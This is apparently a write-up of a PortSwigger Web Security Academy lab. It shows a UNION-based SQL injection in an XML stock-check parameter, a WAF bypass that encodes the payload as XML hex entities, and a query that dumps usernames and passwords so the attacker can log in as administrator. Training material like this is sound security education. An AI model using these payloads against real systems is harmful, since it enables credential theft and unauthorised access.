# SQL Injection with Filter Bypass via XML Encoding


**Platform:** PortSwigger Web Security Academy

**Difficulty:** Practitioner

**Type:** SQL Injection / WAF Bypass / XML Encoding

**Status:** Solved



## 🎯 Objective



Exploit the `storeId` parameter in the stock check feature to retrieve the `administrator` user's credentials and 
log in.



## 🧠 Vulnerability



The stock check request sends `productId` and `storeId` in XML.



Test:



```xml

<storeId>1+1</storeId>

```


If the application evaluates it as `2`, the parameter is vulnerable to SQL injection.



## 1. Test UNION Injection


```sql

1 UNION SELECT NULL

```



The request is blocked by the WAF.



## 2. Bypass the WAF



Because the injection is inside XML, encode the SQL payload using **XML entities**.



In Burp:



```text

Right-click

→ Extensions

→ Hackvertor

→ Encode

→ dec_entities / hex_entities

```



After encoding, resend the request.



If the request succeeds, the WAF has been bypassed.



## 3. Determine the Number of Columns



The original query returns **one column**.



```sql

1 UNION SELECT NULL

```



works, while returning multiple columns causes an error.



Therefore:



```text

Columns = 1

```



## 4. Extract Credentials



Since only one column can be returned, concatenate the username and password:


```sql

1 UNION SELECT username || '~' || password FROM users

```


Encoded in XML using Hackvertor:



```xml

<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>

```



The response returns credentials in this format:



```text

username~password

```



Find:



```text

administrator~<password>

```



## 5. Login



Go to **My account** and log in with:



```text


Username: administrator

Password: <extracted password>

```





## 🔑 Key Takeaways



```text

XML input

   ↓

SQL Injection

   ↓

WAF blocks UNION SELECT
   ↓

XML Entity Encoding

   ↓

WAF Bypass

   ↓

UNION SELECT

   ↓

One-column limitation

   ↓


Concatenate username + password

   ↓

Administrator credentials

```



### Important Concepts



* **SQL Injection**

* **UNION-based SQL Injection**

* **WAF Bypass**

* **XML Entity Encoding**

* **Hackvertor**

* **Column Enumeration**

* **String Concatenation**



> **Key concept:** Encoding the SQL keywords as XML entities can bypass a filter that inspects the raw XML, while 
the application later decodes the entities and processes the resulting SQL.



### Reference


[PortSwigger — SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding?utm_source=chatgpt.com)
